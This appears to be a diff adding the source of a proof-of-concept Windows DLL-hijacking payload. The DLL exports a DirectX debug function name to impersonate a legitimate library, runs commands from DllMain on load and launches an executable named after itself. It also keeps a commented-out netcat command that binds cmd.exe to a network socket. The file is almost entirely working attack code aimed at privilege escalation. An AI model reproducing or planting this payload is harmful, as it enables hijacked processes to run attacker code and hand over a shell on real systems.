@@ -1,0 +1,34 @@
+#include <windows.h>  
+#include <conio.h>  
+#include <tchar.h>
+#include <iostream>
+#include <comdef.h>
+#include <strsafe.h>
+
+extern "C" __declspec(dllexport) void DXGIGetDebugInterface();
+
+#define STR bstr_t
+
+BOOL APIENTRY DllMain(HMODULE hModule,
+	DWORD  ul_reason_for_call,
+	LPVOID lpReserved
+)
+{
+	system("start cmd /c echo stage1");
+	TCHAR szBuffer[MAX_PATH] = { 0 };
+	GetModuleFileName(hModule, szBuffer, sizeof(szBuffer) / sizeof(TCHAR) - 1);
+	STR command;
+	command += L"start ";
+	command += szBuffer;
+	command += L".exe"; // start path\mydll.dll.exe
+	_wsystem(command);
+
+	return TRUE;
+}
+
+void DXGIGetDebugInterface() {
+	system("start cmd /c echo stage2");
+	//system("start cmd /k D:\\EOP\\nc64.exe 127.0.0.1 9999 -e c:\\windows\\system32\\cmd.exe");
+	Sleep(5000);
+	exit(0);
+}
